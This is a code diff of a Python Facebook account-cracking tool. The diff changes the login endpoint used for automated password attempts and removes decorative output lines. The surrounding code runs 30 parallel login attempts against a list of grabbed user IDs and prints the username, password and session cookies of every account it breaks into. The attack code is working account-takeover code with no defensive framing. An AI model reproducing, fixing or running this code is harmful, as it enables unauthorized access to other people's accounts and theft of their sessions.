@@ -232,7 +232,7 @@ class __xxx__:
                     'sec-fetch-site': 'same-origin',
                     'user-agent': ua
                 }
-                po = session.post(f'https://mobile.facebook.com/a/bz?fb_dtsg=NAcNxMfKqYCvBF3D3Xpe4lhhCW0rH2JdogOxD7jWl7nl5GQ5y017CVw%3A0%3A0&jazoest=24793&lsd=AVqFb0wF-Es&__dyn=0wzpawlEaU4ifDg9ppk2m3q12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw73wwyo1Do1u86i0h-0zE1bE881eEdEG0hi0Lo6-0Co2cw8-&__csr=&__req=1&__a=AYnD5WrghhSdAHkU6_CE3kflL93bA-oPevUccN-1BjMbqAywr6Rb-QMS4TBT0EBZe0i_eNmgLj2AjvPpD1-90tlErJylcp4XEAYbYRkCxQoTng&__user=0', data = das, headers = header1, allow_redirects = False)
+                po = session.post('https://mobile.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8', data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     print(f"\r{H} [ð™Žð™ð˜¾ð˜¾ð™€ð™Žð™Ž ð™Žð˜¼ð™…ð™…ð˜¼ð˜¿ -OK] {user} | {pw}")
@@ -285,10 +285,10 @@ class __xxx__:
             os.system("clear")
             print(logo)
             print("\033[1;31m\r                THIS TOOL ONLY DATA USER\033[1;37m")
-            print("\033[1;32mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢")
+            
             print('\033[1;33m Total Auto file IDs : %s ' % len(self.id))
             print('\033[1;34m Cracking Started...')
-            print("\033[1;32mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢")
+            
             with sarfrazssb(max_workers=30) as ssbworld:
                 for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -503,7 +503,7 @@ def auto():
                 print('  Grabbed from: '+ids)
                 print('  Friendlist ids: 0')
                 print('  Token status: Live')
-                print("\033[1;32mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢")
+                
                 os.system('rm -rf temp*')
                 pass
     lenid = open('/sdcard/'+save_file, 'r').readlines()
@@ -511,7 +511,7 @@ def auto():
     os.system('rm -rf temp*')
     print('  Total ids grabbed: '+str(len(lenid)))
     print('  File saved as: /sdcard/'+save_file)
-    print("\033[1;32mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢")
+    
     input('  Press enter to back ')
     safraz()
     
